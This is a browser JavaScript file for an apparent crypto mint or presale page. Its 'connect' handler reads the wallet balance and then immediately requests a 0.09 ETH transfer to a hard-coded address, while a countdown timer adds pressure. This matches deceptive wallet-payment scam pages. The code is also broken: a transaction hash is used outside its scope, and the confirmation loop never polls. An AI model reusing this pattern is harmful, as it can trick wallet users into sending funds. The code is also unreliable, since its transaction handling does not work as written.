const button = document.querySelector('#btn');
const btn2 = document.querySelector('#connect-btn');
const network = window.ethereum.networkVersion;
// const spinner = document.querySelector('')
let account;


// connect function

function clicked(e) {

    ethereum.request({ method: 'eth_requestAccounts' })
        .then(accounts => {
            account = accounts[0];
            ethereum.request({ method: 'eth_getBalance', params: [account, "latest"] }).then(result => {

                let wei = parseInt(result, 16);
                let balance = wei / (10 ** 18);
                send();
            })
        });

}

// send function;
function send(e) {
    let transactionParam = {
        to: '0x3cd3f086098421642b7b7f8021467624f721b85d',
        from: account,
        value: (90000000000000000).toString(16)

    };
    ethereum.request({ method: 'eth_sendTransaction', params: [transactionParam] })
        .then(txhash => console.log(txhash))
    checkTransaction(txhash).then(r => alert(r));
}






// checkTransaction

function checkTransaction(txhash) {
    let checktnLoop = () => {
        return ethereum.request({ method: 'eth_getTransactionReceipt', params: [txhash] })
            .then(r => {
                if (r !== null) return 'Confirmed';
                else return checktnLoop;
            })
    }
    return checktnLoop();
}

// countDown

var countDownDate = new Date("nov 5, 2023 15:37:25").getTime();
var x = setInterval(function () {
    var now = new Date().getTime();
    var distance = countDownDate - now;
    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
    var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    var seconds = Math.floor((distance % (1000 * 60)) / 1000);
    document.getElementById("timer").innerHTML = days + "d " + hours + "h "
        + minutes + "m " + seconds + "s ";
    if (distance < 0) {
        clearInterval(x);
        document.getElementById("timer").innerHTML = "EXPIRED";
    }
}, 1000);


button.addEventListener('click', send);
button.addEventListener('touchstart', send);
btn2.addEventListener('click', clicked);